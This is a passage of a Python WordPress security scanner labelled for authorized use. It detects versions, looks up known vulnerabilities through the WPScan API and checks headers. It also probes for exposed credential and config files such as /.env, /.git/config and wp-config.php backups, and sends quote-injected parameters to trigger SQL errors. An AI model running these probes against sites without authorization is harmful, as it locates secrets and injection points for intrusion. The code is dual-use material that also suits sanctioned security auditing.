#!/usr/bin/env python3
"""
W.A.D.U.H. Scanner v3.0 - Pro Max Feature for Lazy Person
WordPress Analysis & Debugging Utility Helper
AUTHORIZED USE ONLY - DO NOT SCAN TARGETS WITHOUT PERMISSION
"""

import requests
import json
import sys
import re
import os
import argparse
import time
import urllib3
from urllib.parse import urlparse, urljoin
from datetime import datetime, timezone
from requests.exceptions import SSLError, ConnectionError, ReadTimeout
from colorama import Fore, Style, init
from typing import Dict, List, Tuple, Optional, Set
from concurrent.futures import ThreadPoolExecutor, as_completed
import hashlib
import base64
import threading
import ssl
import socket

# Initialize colorama for terminal colors
init(autoreset=True)

# Disable warning for self-signed SSL (common in internal testing)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class YikesScanner:
    """WordPress Security Scanner for Authorized Testing"""

    def __init__(self, args: argparse.Namespace):
        self.target_url: str = ""
        self.wp_version: Optional[str] = None
        self.api_data: Optional[Dict] = None
        self.endpoints_info: List[Dict] = []
        self.summary: Dict = {}
        self.initial_response: Optional[requests.Response] = None
        self.homepage_html: str = ""

        # Configuration from args
        self.verify_ssl: bool = args.verify_ssl
        self.verbose: bool = args.verbose
        self.quiet: bool = args.quiet
        self.rate_limit: float = args.rate_limit
        self.deep_scan: bool = args.deep
        self.output_dir: str = args.output
        self.wpscan_token: Optional[str] = args.wpscan_token or os.getenv('WPSCAN_API_TOKEN')

        # Export options
        self.export_metasploit: bool = args.export_metasploit
        self.export_sqlmap: bool = args.export_sqlmap
        self.generate_pocs: bool = args.generate_pocs

        # v3.0 Export options
        self.export_nuclei: bool = getattr(args, 'export_nuclei', False)
        self.export_burp: bool = getattr(args, 'export_burp', False)
        self.export_zap: bool = getattr(args, 'export_zap', False)
        self.generate_wordlist: bool = getattr(args, 'generate_wordlist', False)

        # v3.0 Scanning options
        self.scan_secrets: bool = getattr(args, 'scan_secrets', False)
        self.scan_cors: bool = getattr(args, 'scan_cors', False)
        self.scan_cookies: bool = getattr(args, 'scan_cookies', False)
        self.scan_ssl: bool = getattr(args, 'scan_ssl', False)
        self.scan_graphql: bool = getattr(args, 'scan_graphql', False)
        self.enhanced_backups: bool = getattr(args, 'enhanced_backups', False)

        # v3.0 Integration options
        self.webhook: Optional[str] = getattr(args, 'webhook', None)
        self.compare_with: Optional[str] = getattr(args, 'compare_with', None)
        self.cvss_scoring: bool = getattr(args, 'cvss_scoring', False)

        # v3.0 Multi-target options
        self.target_list: Optional[str] = getattr(args, 'target_list', None)
        self.parallel: int = getattr(args, 'parallel', 3)

        # v3.0 Precision & Advanced Testing
        self.advanced_scan: bool = getattr(args, 'advanced', False)
        self.test_xxe: bool = getattr(args, 'test_xxe', False) or self.advanced_scan
        self.test_ssrf: bool = getattr(args, 'test_ssrf', False) or self.advanced_scan
        self.test_sqli: bool = getattr(args, 'test_sqli', False) or self.advanced_scan
        self.test_auth: bool = getattr(args, 'test_auth', False) or self.advanced_scan
        self.test_csrf: bool = getattr(args, 'test_csrf', False) or self.advanced_scan
        self.test_jwt: bool = getattr(args, 'test_jwt', False) or self.advanced_scan
        self.test_ssti: bool = getattr(args, 'test_ssti', False) or self.advanced_scan
        self.test_deserial: bool = getattr(args, 'test_deserial', False) or self.advanced_scan
        self.test_traversal: bool = getattr(args, 'test_traversal', False) or self.advanced_scan
        self.test_cmdi: bool = getattr(args, 'test_cmdi', False) or self.advanced_scan
        self.test_upload: bool = getattr(args, 'test_upload', False) or self.advanced_scan

        # Findings storage
        self.vulnerabilities: List[Dict] = []
        self.info_leaks: List[Dict] = []
        self.security_issues: List[Dict] = []

        # WPScan data
        self.wpscan_enabled: bool = self.wpscan_token is not None
        self.detected_plugins: List[Dict] = []
        self.detected_themes: List[Dict] = []

        # Enumeration data for exploitation
        self.found_users: List[str] = []
        self.xmlrpc_enabled: bool = False
        self.dangerous_xmlrpc_methods: List[str] = []
        self.sql_injection_params: List[str] = []

        # UPDATED HEADERS: Mimic a real Chrome Browser
        self.headers = {
            'User-Agent': (
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                'AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/120.0.0.0 Safari/537.36'
            ),
            'Accept': (
                'text/html,application/xhtml+xml,application/xml;'
                'q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
            ),
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1'
        }

    def banner(self) -> None:
        """Display scanner banner"""
        if not self.quiet:
            print(Fore.CYAN + Style.BRIGHT + r"""
    ========================================
      W.A.D.U.H. SCANNER v3.0 - Complete Automation Edition
(Wordpress Analysis & Debugging Utility Helper)
    ========================================
    [!] AUTHORIZED USE ONLY
    [!] DO NOT SCAN TARGETS WITHOUT PERMISSION
    ========================================
            """)
            if self.wpscan_enabled:
                print(Fore.GREEN + "    [+] WPScan API: Enabled")
            else:
                print(Fore.YELLOW + "    [-] WPScan API: Disabled (use --wpscan-token)")

            # Show export features
            exports = []
            if self.export_metasploit:
                exports.append("Metasploit")
            if self.export_sqlmap:
                exports.append("SQLMap")
            if self.generate_pocs:
                exports.append("PoCs")
            if self.export_nuclei:
                exports.append("Nuclei")
            if self.export_burp:
                exports.append("Burp Suite")
            if self.export_zap:
                exports.append("ZAP")

            if exports:
                print(Fore.GREEN + f"    [+] Export Modes: {', '.join(exports)}")
            print(Fore.GREEN + "    [+] Exploitation Guide: Always generated")

            # Show v3.0 features
            v3_features = []
            if self.scan_secrets:
                v3_features.append("API Key Scanner")
            if self.generate_wordlist:
                v3_features.append("Custom Wordlist")
            if self.webhook:
                v3_features.append("Webhook Notifications")
            if self.cvss_scoring:
                v3_features.append("CVSS Scoring")
            if self.target_list:
                v3_features.append(f"Multi-Target ({self.parallel} parallel)")

            if v3_features:
                print(Fore.CYAN + f"    [+] v3.0 Features: {', '.join(v3_features)}")

            # Show precision/advanced mode
            if self.advanced_scan:
                print(Fore.MAGENTA + Style.BRIGHT + "    [★] PRECISION MODE: All advanced tests enabled")
            else:
                advanced_tests = []
                if self.test_sqli:
                    advanced_tests.append("SQLi")
                if self.test_xxe:
                    advanced_tests.append("XXE")
                if self.test_ssrf:
                    advanced_tests.append("SSRF")
                if self.test_auth:
                    advanced_tests.append("Auth Bypass")
                if self.test_ssti:
                    advanced_tests.append("SSTI")
                if self.test_cmdi:
                    advanced_tests.append("Command Injection")
                if self.test_traversal:
                    advanced_tests.append("Path Traversal")

                if advanced_tests:
                    print(Fore.MAGENTA + f"    [★] Precision Tests: {', '.join(advanced_tests)}")

    def log(self, message: str, color=Fore.WHITE, level: str = "info") -> None:
        """Log messages with verbosity control"""
        if self.quiet and level == "info":
            return
        if not self.verbose and level == "debug":
            return
        print(color + message)

    def add_vulnerability(self, title: str, description: str, severity: str = "medium",
                         confidence: str = "high", evidence: str = "",
                         exploit_available: bool = False) -> None:
        """Track discovered vulnerabilities with confidence scoring"""
        self.vulnerabilities.append({
            "title": title,
            "description": description,
            "severity": severity,
            "confidence": confidence,  # high, medium, low
            "evidence": evidence,
            "exploit_available": exploit_available,
            "timestamp": datetime.now(timezone.utc).isoformat()
        })

    def add_info_leak(self, title: str, description: str) -> None:
        """Track information leaks"""
        self.info_leaks.append({
            "title": title,
            "description": description,
            "timestamp": datetime.now(timezone.utc).isoformat()
        })

    def add_security_issue(self, title: str, description: str) -> None:
        """Track security misconfigurations"""
        self.security_issues.append({
            "title": title,
            "description": description,
            "timestamp": datetime.now(timezone.utc).isoformat()
        })

    def apply_rate_limit(self) -> None:
        """Apply rate limiting between requests"""
        if self.rate_limit > 0:
            time.sleep(self.rate_limit)

    def make_request(self, url: str, timeout: Tuple[int, int] = (5, 20),
                    method: str = "GET", **kwargs) -> Optional[requests.Response]:
        """Helper method for making HTTP requests with consistent settings"""
        self.apply_rate_limit()
        try:
            if method.upper() == "GET":
                return requests.get(
                    url,
                    headers=self.headers,
                    verify=self.verify_ssl,
                    timeout=timeout,
                    **kwargs
                )
            elif method.upper() == "POST":
                return requests.post(
                    url,
                    headers=self.headers,
                    verify=self.verify_ssl,
                    timeout=timeout,
                    **kwargs
                )
            elif method.upper() == "HEAD":
                return requests.head(
                    url,
                    headers=self.headers,
                    verify=self.verify_ssl,
                    timeout=timeout,
                    **kwargs
                )
        except Exception as e:
            self.log(f"[!] Request error for {url}: {e}", Fore.RED, "debug")
            return None

    def get_input(self) -> None:
        """Get URL input from the user"""
        url = input(
            Fore.YELLOW
            + "[?] Enter Target URL (e.g., http://localhost or https://example.com): "
        ).strip()

        # Simple validation to ensure schema exists
        if not url.startswith("http"):
            url = "http://" + url

        # Remove trailing slash for consistency
        self.target_url = url.rstrip('/')
        self.log(f"[*] Target set to: {self.target_url}\n", Fore.GREEN)

    # ---------------- BASIC CONNECTIVITY ----------------

    def check_connection(self) -> bool:
        """Check if the server is reachable"""
        self.log(f"[*] Attempting to connect to: {self.target_url} ...", Fore.YELLOW)

        try:
            r = self.make_request(self.target_url, timeout=(5, 30), allow_redirects=True)

            if not r:
                return False

            self.initial_response = r

            # Treat 2xx and 3xx as "reachable"
            if 200 <= r.status_code < 400:
                self.log(f"[+] Connection Established! (HTTP {r.status_code})", Fore.GREEN)
                server = r.headers.get("Server")
                if server:
                    self.log(f"    Server header: {server}", Fore.CYAN)
                    self.add_info_leak("Server Header Exposed", f"Server: {server}")
                return True
            else:
                self.log(
                    f"[-] Server reachable, but responded with status code: {r.status_code}",
                    Fore.RED
                )
                return False

        except SSLError:
            self.log("[!] SSL Certificate Error.", Fore.RED)
            self.log(
                "    [Tip] If this is an internal server, try --verify-ssl flag.",
                Fore.YELLOW
            )
            return False

        except ReadTimeout:
            self.log("[!] Connection timed out while waiting for a response.", Fore.RED)
            self.log(
                "    [Tip] Target may be slow or blocking you. Try increasing timeout or scanning later.",
                Fore.YELLOW
            )
            return False

        except ConnectionError as e:
            self.log("[!] Connection Failed.", Fore.RED)
            self.log(f"    Detail: {e}", Fore.WHITE)
            return False

        except Exception as e:
            self.log(f"[!] Unexpected Error: {e}", Fore.RED)
            return False

    # ---------------- WP VERSION & BASIC ENUM ----------------

    def detect_version(self) -> None:
        """Detect WordPress version using multiple methods"""
        self.log("[*] Attempting to detect WordPress version...", Fore.BLUE)

        version_found = False

        # Method 1: Check meta generator tag
        try:
            r = self.make_request(self.target_url, timeout=(5, 20))
            if r and r.status_code == 200:
                self.homepage_html = r.text

                # Multiple regex patterns for version detection
                patterns = [
                    r'content="WordPress (\d+\.\d+(?:\.\d+)?)"',
                    r'<meta name="generator" content="WordPress (\d+\.\d+(?:\.\d+)?)"',
                    r'WordPress (\d+\.\d+(?:\.\d+)?)',
                ]

                for pattern in patterns:
                    match = re.search(pattern, r.text, re.IGNORECASE)
                    if match:
                        self.wp_version = match.group(1)
                        self.log(f"[+] WordPress Version Detected: {self.wp_version}", Fore.GREEN)
                        self.add_info_leak("WordPress Version Exposed", f"Version: {self.wp_version}")
                        version_found = True
                        break

        except Exception as e:
            self.log(f"[!] Error detecting version from HTML: {e}", Fore.RED, "debug")

        # Method 2: Check readme.html
        if not version_found:
            self.log("[*] Checking readme.html for version...", Fore.YELLOW, "debug")
            readme_url = f"{self.target_url}/readme.html"
            r = self.make_request(readme_url, timeout=(5, 15))
            if r and r.status_code == 200:
                match = re.search(r'Version (\d+\.\d+(?:\.\d+)?)', r.text)
                if match:
                    self.wp_version = match.group(1)
                    self.log(f"[+] WordPress Version from readme.html: {self.wp_version}", Fore.GREEN)
                    self.add_info_leak("Version in readme.html", f"Version: {self.wp_version}")
                    version_found = True

        # Method 3: Check RSS feed
        if not version_found and self.deep_scan:
            self.log("[*] Checking RSS feed for version...", Fore.YELLOW, "debug")
            rss_url = f"{self.target_url}/feed/"
            r = self.make_request(rss_url, timeout=(5, 15))
            if r and r.status_code == 200:
                match = re.search(r'generator[=>]*WordPress (\d+\.\d+(?:\.\d+)?)', r.text, re.IGNORECASE)
                if match:
                    self.wp_version = match.group(1)
                    self.log(f"[+] WordPress Version from RSS: {self.wp_version}", Fore.GREEN)
                    self.add_info_leak("Version in RSS Feed", f"Version: {self.wp_version}")
                    version_found = True

        if version_found:
            self.check_cve_link()
        else:
            self.log(
                "[-] WordPress Version is hidden (Good security practice).",
                Fore.YELLOW
            )

    def check_cve_link(self) -> None:
        """Provide CVE links and check if version is outdated"""
        self.log("[*] Vulnerability Analysis (CVE):", Fore.MAGENTA)
        if self.wp_version:
            cve_url = (
                "https://www.cvedetails.com/vulnerability-list/"
                f"vendor_id-2337/product_id-4096/version-{self.wp_version}/"
                "WordPress-WordPress.html"
            )
            self.log("    Check CVEs for this version at:", Fore.CYAN)
            self.log(f"    -> {cve_url}", Fore.CYAN)

            # Check if version is old (simple heuristic)
            try:
                major, minor = map(int, self.wp_version.split('.')[:2])
                if major < 6 or (major == 6 and minor < 4):
                    self.log(
                        "    [!] WARNING: This appears to be an outdated WordPress version!",
                        Fore.RED
                    )
                    self.add_vulnerability(
                        "Outdated WordPress Version",
                        f"Version {self.wp_version} is outdated and likely has known vulnerabilities",
                        "high"
                    )
            except:
                pass

            self.log(
                "    [Tip] Older versions likely have known vulnerabilities.",
                Fore.YELLOW
            )

            # Check WPScan database if enabled
            if self.wpscan_enabled:
                self.check_wpscan_wordpress_vuln()
        else:
            self.log("    Cannot generate CVE link because version is unknown.")

    # ---------------- WPSCAN API INTEGRATION ----------------

    def wpscan_query_api(self, endpoint: str, params: Optional[Dict] = None) -> Optional[Dict]:
        """Query WPScan API with rate limiting and error handling"""
        if not self.wpscan_enabled:
            return None

        base_url = "https://wpscan.com/api/v3"
        url = f"{base_url}/{endpoint}"

        headers = {
            'Authorization': f'Token token={self.wpscan_token}',
            'User-Agent': 'WADUH Scanner v2.1'
        }

        try:
            self.apply_rate_limit()
            r = requests.get(url, headers=headers, params=params, timeout=10)

            if r.status_code == 200:
                return r.json()
            elif r.status_code == 401:
                self.log("    [!] WPScan API: Invalid token", Fore.RED)
                self.wpscan_enabled = False
                return None
            elif r.status_code == 429:
                self.log("    [!] WPScan API: Rate limit exceeded", Fore.YELLOW)
                return None
            elif r.status_code == 404:
                # No data found - not an error
                return None
            else:
                self.log(f"    [!] WPScan API error: HTTP {r.status_code}", Fore.RED, "debug")
                return None

        except Exception as e:
            self.log(f"    [!] WPScan API request failed: {e}", Fore.RED, "debug")
            return None

    def check_wpscan_wordpress_vuln(self) -> None:
        """Check WordPress core vulnerabilities using WPScan API"""
        if not self.wpscan_enabled or not self.wp_version:
            return

        self.log("\n[*] Checking WPScan database for WordPress core vulnerabilities...", Fore.BLUE)

        # Query WPScan API for WordPress version vulnerabilities
        data = self.wpscan_query_api(f"wordpresses/{self.wp_version}")

        if not data:
            self.log("    [-] No WPScan data available for this version", Fore.YELLOW, "debug")
            return

        vulnerabilities = data.get(self.wp_version, {}).get('vulnerabilities', [])

        if not vulnerabilities:
            self.log(f"    [+] No known vulnerabilities in WPScan database for WordPress {self.wp_version}", Fore.GREEN)
            return

        self.log(f"    [!] Found {len(vulnerabilities)} known vulnerabilities in WPScan database!", Fore.RED)

        for vuln in vulnerabilities:
            title = vuln.get('title', 'Unknown')
            vuln_type = vuln.get('vuln_type', 'Unknown')
            fixed_in = vuln.get('fixed_in', 'Not fixed')

            # Get CVE references
            references = vuln.get('references', {})
            cve = references.get('cve', [])
            wpvulndb = references.get('url', [])

            self.log(f"\n    [!] {title}", Fore.RED)
            self.log(f"        Type: {vuln_type}", Fore.YELLOW)
            self.log(f"        Fixed in: {fixed_in}", Fore.CYAN)

            if cve:
                self.log(f"        CVE: {', '.join(cve)}", Fore.MAGENTA)

            if wpvulndb and self.verbose:
                for url in wpvulndb[:2]:  # Show first 2 URLs
                    self.log(f"        Reference: {url}", Fore.CYAN, "debug")

            # Add to vulnerabilities list
            severity = "critical" if "rce" in vuln_type.lower() or "sql injection" in vuln_type.lower() else "high"
            self.add_vulnerability(
                f"WordPress Core: {title}",
                f"Type: {vuln_type}, Fixed in: {fixed_in}, CVE: {', '.join(cve) if cve else 'N/A'}",
                severity
            )

    def check_wpscan_plugin_vuln(self, plugin_slug: str, plugin_version: Optional[str] = None) -> None:
        """Check plugin vulnerabilities using WPScan API"""
        if not self.wpscan_enabled:
            return

        self.log(f"    [*] Checking WPScan database for {plugin_slug}...", Fore.YELLOW, "debug")

        # Query WPScan API for plugin vulnerabilities
        data = self.wpscan_query_api(f"plugins/{plugin_slug}")

        if not data:
            self.log(f"        [-] No WPScan data for {plugin_slug}", Fore.CYAN, "debug")
            return

        plugin_data = data.get(plugin_slug, {})
        vulnerabilities = plugin_data.get('vulnerabilities', [])
        latest_version = plugin_data.get('latest_version')
        last_updated = plugin_data.get('last_updated')
        popular = plugin_data.get('popular', False)

        if not vulnerabilities:
            self.log(f"        [+] No known vulnerabilities for {plugin_slug}", Fore.GREEN, "debug")
            return

        # Filter vulnerabilities by version if we have it
        relevant_vulns = []
        if plugin_version:
            for vuln in vulnerabilities:
                fixed_in = vuln.get('fixed_in')
                if not fixed_in or (plugin_version < fixed_in):
                    relevant_vulns.append(vuln)
        else:
            relevant_vulns = vulnerabilities

        if not relevant_vulns:
            self.log(f"        [+] Plugin version appears patched", Fore.GREEN, "debug")
            return

        self.log(f"        [!] Found {len(relevant_vulns)} vulnerabilities for {plugin_slug}!", Fore.RED)

        for vuln in relevant_vulns[:5]:  # Limit to 5 most relevant
            title = vuln.get('title', 'Unknown')
            vuln_type = vuln.get('vuln_type', 'Unknown')
            fixed_in = vuln.get('fixed_in', 'Not fixed')

            self.log(f"        [!] {title}", Fore.RED)
            self.log(f"            Type: {vuln_type}, Fixed in: {fixed_in}", Fore.YELLOW)

            # Determine severity
            severity = "high"
            if "rce" in vuln_type.lower() or "sql injection" in vuln_type.lower():
                severity = "critical"
            elif "xss" in vuln_type.lower() or "csrf" in vuln_type.lower():
                severity = "medium"

            self.add_vulnerability(
                f"Plugin {plugin_slug}: {title}",
                f"Type: {vuln_type}, Fixed in: {fixed_in}",
                severity
            )

    def check_wpscan_theme_vuln(self, theme_slug: str, theme_version: Optional[str] = None) -> None:
        """Check theme vulnerabilities using WPScan API"""
        if not self.wpscan_enabled:
            return

        self.log(f"    [*] Checking WPScan database for theme {theme_slug}...", Fore.YELLOW, "debug")

        # Query WPScan API for theme vulnerabilities
        data = self.wpscan_query_api(f"themes/{theme_slug}")

        if not data:
            self.log(f"        [-] No WPScan data for theme {theme_slug}", Fore.CYAN, "debug")
            return

        theme_data = data.get(theme_slug, {})
        vulnerabilities = theme_data.get('vulnerabilities', [])

        if not vulnerabilities:
            self.log(f"        [+] No known vulnerabilities for theme {theme_slug}", Fore.GREEN, "debug")
            return

        # Filter vulnerabilities by version if we have it
        relevant_vulns = []
        if theme_version:
            for vuln in vulnerabilities:
                fixed_in = vuln.get('fixed_in')
                if not fixed_in or (theme_version < fixed_in):
                    relevant_vulns.append(vuln)
        else:
            relevant_vulns = vulnerabilities

        if not relevant_vulns:
            self.log(f"        [+] Theme version appears patched", Fore.GREEN, "debug")
            return

        self.log(f"        [!] Found {len(relevant_vulns)} vulnerabilities for theme {theme_slug}!", Fore.RED)

        for vuln in relevant_vulns[:5]:  # Limit to 5 most relevant
            title = vuln.get('title', 'Unknown')
            vuln_type = vuln.get('vuln_type', 'Unknown')
            fixed_in = vuln.get('fixed_in', 'Not fixed')

            self.log(f"        [!] {title}", Fore.RED)
            self.log(f"            Type: {vuln_type}, Fixed in: {fixed_in}", Fore.YELLOW)

            severity = "high" if "xss" in vuln_type.lower() else "medium"

            self.add_vulnerability(
                f"Theme {theme_slug}: {title}",
                f"Type: {vuln_type}, Fixed in: {fixed_in}",
                severity
            )

    # ---------------- SECURITY HEADERS ----------------

    def check_security_headers(self) -> None:
        """Check common security-related HTTP headers"""
        self.log("[*] Checking security-related HTTP headers...", Fore.BLUE)

        if not self.initial_response:
            self.log("[-] No initial response captured; skipping header analysis.", Fore.YELLOW)
            return

        headers = self.initial_response.headers

        security_headers = {
            "Content-Security-Policy": "Helps prevent XSS attacks",
            "X-Frame-Options": "Prevents clickjacking",
            "X-Content-Type-Options": "Prevents MIME sniffing",
            "Strict-Transport-Security": "Enforces HTTPS",
            "Referrer-Policy": "Controls referrer information",
            "Permissions-Policy": "Controls browser features",
            "X-XSS-Protection": "Legacy XSS protection",
        }

        missing_headers = []
        for header, description in security_headers.items():
            val = headers.get(header)
            if val:
                self.log(f"    [+] {header}: {val}", Fore.GREEN, "debug")
            else:
                self.log(f"    [-] {header}: (missing) - {description}", Fore.RED)
                missing_headers.append(header)

        if missing_headers:
            self.add_security_issue(
                "Missing Security Headers",
                f"Missing headers: {', '.join(missing_headers)}"
            )

    # ---------------- WP ARTIFACT CHECKS ----------------

    def check_wp_artifacts(self) -> None:
        """Probe common WP endpoints"""
        self.log("[*] Checking common WordPress artifacts...", Fore.BLUE)

        paths = {
            "/wp-login.php": ("Login page", "info"),
            "/xmlrpc.php": ("XML-RPC endpoint", "warning"),
            "/readme.html": ("Default readme", "warning"),
            "/license.txt": ("License file", "info"),
            "/wp-admin/": ("Admin dashboard", "info"),
            "/wp-admin/install.php": ("Installation script", "critical"),
            "/wp-config.php": ("Config file", "critical"),
            "/wp-config.php.bak": ("Config backup", "critical"),
            "/wp-config.php.old": ("Old config", "critical"),
            "/wp-config.php~": ("Config temp file", "critical"),
        }

        for path, (desc, _) in paths.items():
            url = f"{self.target_url}{path}"
            r = self.make_request(url, timeout=(5, 15), allow_redirects=True)

            if not r:
                continue

            status = r.status_code
            line = f"    {desc} ({path}) -> HTTP {status}"

            # Risk assessment
            if path == "/xmlrpc.php" and status == 200:
                line += " [POTENTIAL RISK: xmlrpc enabled]"
                self.log(line, Fore.RED)
                self.add_vulnerability(
                    "XMLRPC Enabled",
                    "XMLRPC endpoint is accessible and may be vulnerable to brute force or DDoS attacks",
                    "medium"
                )
            elif path == "/readme.html" and status == 200:
                line += " [INFO LEAK: readme present]"
                self.log(line, Fore.YELLOW)
                self.add_info_leak("Readme.html Accessible", "Default WordPress readme file is accessible")
            elif path == "/wp-login.php" and status in (200, 302):
                line += " [Login page exposed]"
                self.log(line, Fore.CYAN)
            elif "wp-config" in path and status == 200:
                line += " [CRITICAL: Config file accessible!]"
                self.log(line, Fore.RED + Style.BRIGHT)
                self.add_vulnerability(
                    "Config File Exposed",
                    f"{path} is publicly accessible - IMMEDIATE ACTION REQUIRED",
                    "critical"
                )
            elif path == "/wp-admin/install.php" and status == 200:
                self.log(line + " [CRITICAL: Installation accessible!]", Fore.RED + Style.BRIGHT)
                self.add_vulnerability(
                    "Installation Script Accessible",
                    "WordPress installation script is accessible",
                    "high"
                )
            else:
                self.log(line, Fore.CYAN, "debug")

    # ---------------- DIRECTORY LISTING CHECKS ----------------

    def check_directory_listing(self) -> None:
        """Check for directory listing on common WP paths"""
        self.log("[*] Checking for directory listing in common paths...", Fore.BLUE)

        dirs = [
            "/wp-content/",
            "/wp-content/uploads/",
            "/wp-content/plugins/",
            "/wp-content/themes/",
            "/wp-includes/",
        ]

        for d in dirs:
            url = f"{self.target_url}{d}"
            r = self.make_request(url, timeout=(5, 15))

            if not r:
                continue

            if r.status_code == 200:
                # Multiple patterns for directory listing detection
                patterns = ["Index of /", "<title>Index of", "Parent Directory", "[To Parent Directory]"]
                if any(pattern in r.text for pattern in patterns):
                    self.log(
                        f"    [!] {d} appears to be browsable (Directory listing enabled)",
                        Fore.RED
                    )
                    self.add_security_issue(
                        "Directory Listing Enabled",
                        f"Directory listing is enabled for {d}"
                    )
                else:
                    self.log(f"    [+] {d} does not expose directory listing.", Fore.GREEN, "debug")
            else:
                self.log(f"    {d} -> HTTP {r.status_code}", Fore.CYAN, "debug")

    # ---------------- PLUGIN & THEME ENUM ----------------

    def enumerate_plugins_themes(self) -> None:
        """Extract plugin & theme names from homepage HTML"""
        self.log("[*] Enumerating plugins & themes from HTML...", Fore.BLUE)

        html = self.homepage_html or ""
        plugins = sorted(set(re.findall(r'/wp-content/plugins/([^/\'"?]+)', html)))
        themes = sorted(set(re.findall(r'/wp-content/themes/([^/\'"?]+)', html)))

        if plugins:
            self.log(f"    [+] Detected Plugins ({len(plugins)}):", Fore.MAGENTA)
            for p in plugins:
                self.log(f"      - {p}", Fore.CYAN)
                if self.deep_scan:
                    self.check_plugin_vulnerability(p)
        else:
            self.log("    [-] No plugins detected from HTML paths.", Fore.YELLOW)

        if themes:
            self.log(f"    [+] Detected Themes ({len(themes)}):", Fore.MAGENTA)
            for t in themes:
                self.log(f"      - {t}", Fore.CYAN)
                if self.deep_scan:
                    self.check_theme_vulnerability(t)
        else:
            self.log("    [-] No themes detected from HTML paths.", Fore.YELLOW)

    def check_plugin_vulnerability(self, plugin_name: str) -> None:
        """Check for common plugin vulnerabilities"""
        plugin_version = None

        # Check for readme.txt
        readme_url = f"{self.target_url}/wp-content/plugins/{plugin_name}/readme.txt"
        r = self.make_request(readme_url, timeout=(5, 10))

        if r and r.status_code == 200:
            self.log(f"        [!] {plugin_name} readme.txt is accessible", Fore.YELLOW, "debug")
            # Try to extract version
            version_match = re.search(r'Stable tag:\s*([0-9.]+)', r.text, re.IGNORECASE)
            if version_match:
                plugin_version = version_match.group(1)
                self.log(f"        Version: {plugin_version}", Fore.CYAN, "debug")

        # Check WPScan database for vulnerabilities
        if self.wpscan_enabled:
            self.check_wpscan_plugin_vuln(plugin_name, plugin_version)

        # Store detected plugin
        self.detected_plugins.append({
            'slug': plugin_name,
            'version': plugin_version
        })

    def check_theme_vulnerability(self, theme_name: str) -> None:
        """Check for common theme vulnerabilities"""
        theme_version = None

        # Check for style.css
        style_url = f"{self.target_url}/wp-content/themes/{theme_name}/style.css"
        r = self.make_request(style_url, timeout=(5, 10))

        if r and r.status_code == 200:
            # Try to extract version
            version_match = re.search(r'Version:\s*([0-9.]+)', r.text, re.IGNORECASE)
            if version_match:
                theme_version = version_match.group(1)
                self.log(f"        [!] {theme_name} version {theme_version} detected", Fore.YELLOW, "debug")

        # Check WPScan database for vulnerabilities
        if self.wpscan_enabled:
            self.check_wpscan_theme_vuln(theme_name, theme_version)

        # Store detected theme
        self.detected_themes.append({
            'slug': theme_name,
            'version': theme_version
        })

    # ---------------- SENSITIVE FILE DETECTION ----------------

    def check_sensitive_files(self) -> None:
        """Check for sensitive files and backups"""
        self.log("[*] Checking for sensitive files and backups...", Fore.BLUE)

        sensitive_files = [
            "/.git/HEAD",
            "/.git/config",
            "/.gitignore",
            "/.svn/entries",
            "/.env",
            "/.DS_Store",
            "/wp-config.php.bak",
            "/wp-config.php.old",
            "/wp-config.php.save",
            "/wp-config.php.swp",
            "/wp-config.txt",
            "/backup.sql",
            "/dump.sql",
            "/database.sql",
            "/db_backup.sql",
            "/wordpress.sql",
            "/.htaccess.bak",
            "/error_log",
            "/debug.log",
            "/php.ini",
            "/.user.ini",
        ]

        found_sensitive = []
        for file_path in sensitive_files:
            url = f"{self.target_url}{file_path}"
            r = self.make_request(url, timeout=(5, 10), allow_redirects=False)

            if r and r.status_code == 200:
                self.log(f"    [!] FOUND: {file_path} (HTTP {r.status_code})", Fore.RED)
                found_sensitive.append(file_path)

                severity = "critical" if any(x in file_path for x in ["wp-config", ".env", ".sql", ".git"]) else "medium"
                self.add_vulnerability(
                    f"Sensitive File Exposed: {file_path}",
                    f"Sensitive file {file_path} is publicly accessible",
                    severity
                )

        if not found_sensitive:
            self.log("    [+] No common sensitive files found (good!)", Fore.GREEN)

    # ---------------- ROBOTS.TXT & SITEMAP ----------------

    def check_robots_sitemap(self) -> None:
        """Check robots.txt and sitemap.xml for information"""
        self.log("[*] Checking robots.txt and sitemap.xml...", Fore.BLUE)

        # Check robots.txt
        robots_url = f"{self.target_url}/robots.txt"
        r = self.make_request(robots_url, timeout=(5, 10))

        if r and r.status_code == 200:
            self.log("    [+] robots.txt found:", Fore.GREEN)
            if self.verbose:
                for line in r.text.split('\n')[:20]:  # Show first 20 lines
                    if line.strip():
                        self.log(f"        {line}", Fore.CYAN, "debug")

            # Check for interesting disallows
            disallows = re.findall(r'Disallow:\s*(.+)', r.text, re.IGNORECASE)
            if disallows:
                self.log(f"    Found {len(disallows)} disallowed paths", Fore.YELLOW)

        # Check sitemap.xml
        sitemap_url = f"{self.target_url}/sitemap.xml"
        r = self.make_request(sitemap_url, timeout=(5, 10))

        if r and r.status_code == 200:
            self.log("    [+] sitemap.xml found", Fore.GREEN)
            # Count URLs in sitemap
            urls = re.findall(r'<loc>(.+?)</loc>', r.text)
            if urls:
                self.log(f"    Sitemap contains {len(urls)} URLs", Fore.CYAN)

    # ---------------- DATABASE ERROR DETECTION ----------------

    def check_database_errors(self) -> None:
        """Try to trigger database errors to detect misconfigurations"""
        self.log("[*] Checking for database error exposure...", Fore.BLUE)

        # Common SQL error triggers
        test_params = [
            "?p=1'",
            "?cat=1'",
            "?s=test'",
        ]

        error_patterns = [
            "SQL syntax",
            "mysql_fetch",
            "mysql_query",
            "Warning: mysql",
            "mysqli_",
            "database error",
            "PostgreSQL",
            "SQL Server",
        ]

        for param in test_params:
            url = f"{self.target_url}/{param}"
            r = self.make_request(url, timeout=(5, 10))

            if r and r.status_code == 200:
                for pattern in error_patterns:
                    if pattern.lower() in r.text.lower():
                        self.sql_injection_params.append(param)
                        self.log(
                            f"    [!] Potential database error detected with {param}",
                            Fore.RED
                        )
                        self.add_vulnerability(
                            "Database Error Disclosure",
                            f"Database errors are exposed to users (tested with {param})",
                            "medium"
                        )
                        return

        self.log("    [+] No obvious database error disclosure found", Fore.GREEN, "debug")

    # ---------------- USER ENUMERATION ----------------

